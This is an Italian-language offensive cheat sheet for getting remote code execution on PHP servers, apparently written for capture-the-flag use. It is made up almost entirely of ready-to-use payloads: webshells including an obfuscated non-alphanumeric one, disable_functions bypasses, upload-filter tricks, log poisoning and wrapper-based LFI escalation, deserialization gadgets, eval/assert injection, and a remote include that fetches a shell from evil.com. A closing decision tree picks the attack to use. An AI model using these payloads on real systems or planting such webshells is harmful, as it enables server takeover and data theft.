# PHP RCE — Remote Code Execution

Tecniche per eseguire codice su server PHP.

---

## 🔴 Quando Usare

- Sito PHP (estensioni .php, header X-Powered-By: PHP)
- Form upload, LFI/RFI, deserialization
- Errori PHP visibili

---

## 1. Funzioni di Esecuzione Diretta

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php exec($_GET['cmd'], $output); print_r($output); ?>
<?php echo `$_GET[cmd]`; ?>
<?php popen($_GET['cmd'], 'r'); ?>
<?php proc_open($_GET['cmd'], ...); ?>
```

---

## 2. Webshell Minimali

```php
# Classico
<?php system($_GET['c']); ?>

# Super corto
<?=`$_GET[c]`?>

# POST-based
<?php system($_POST['c']); ?>

# Base64 encoded command
<?php system(base64_decode($_GET['c'])); ?>
```

---

## 3. Bypass disable_functions

Quando funzioni pericolose sono disabilitate.

```php
# Via mail() + LD_PRELOAD
<?php
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@a.com","","","");
?>

# Via FFI (PHP 7.4+)
<?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("cat /flag.txt");
?>

# Via imap_open
<?php
imap_open('{localhost:143/imap}INBOX', '', '', '/nostrings', 0, array('DISABLE_AUTHENTICATOR' => 'GSSAPI'));
?>
```

---

## 4. Upload Bypass

```php
# Magic bytes per bypass MIME check
GIF89a<?php system($_GET['c']); ?>

# PNG header
\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>

# Double extension
shell.php.jpg
shell.php%00.jpg  # null byte (vecchie versioni)
shell.pHp (case variation)
shell.php5, shell.phtml, shell.phar

# .htaccess upload
AddType application/x-httpd-php .gif
```

---

## 5. LFI to RCE

```php
# Log poisoning - Apache
GET /<?php system($_GET['c']); ?>
# Poi include: ?page=/var/log/apache2/access.log&c=id

# Log poisoning - SSH auth
ssh '<?php system($_GET["c"]); ?>'@target
# Include: ?page=/var/log/auth.log

# Via /proc/self/environ
User-Agent: <?php system($_GET['c']); ?>
# Include: ?page=/proc/self/environ

# Via PHP sessions
# Imposta session, poi include /tmp/sess_XXXXX

# Via wrapper
?page=data://text/plain,<?php system($_GET['c']); ?>&c=id
?page=php://input  (con POST body <?php system('id'); ?>)
?page=expect://id
```

---

## 6. Deserialization RCE

```php
# Gadget comune - Monolog/RCE
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{...}}

# Trova gadget con PHPGGC:
phpggc -l  # lista gadget
phpggc Laravel/RCE1 system 'cat /flag.txt'
```

---

## 7. Eval/Assert Injection

```php
# Se input finisce in eval()
');system('cat /flag.txt');//

# Se input in assert()
'.system('id').'
```

---

## 8. Payloads Pronti

```php
# Webshell one-liner
<?=`$_GET[0]`?>

# Non-alphanumeric webshell
<?=$_="";$_="'".$_."'";$_=($_^"<").($_## ^">").($_^"/");${"_$_"}[_](${"_$_"}[__]);?>

# Bypass WAF
<?php $x = "sys"."tem"; $x($_GET['c']); ?>

# Include remoto
<?php include $_GET['u']; ?>
# Uso: ?u=http://evil.com/shell.txt
```

---

## 🎯 Decision Tree

1. **Upload possibile?** → Webshell (bypass extension/MIME)
2. **LFI trovato?** → Log poisoning o wrapper
3. **Eval/assert?** → Payload escape
4. **Deserialization?** → PHPGGC
5. **disable_functions?** → FFI, mail+LD_PRELOAD
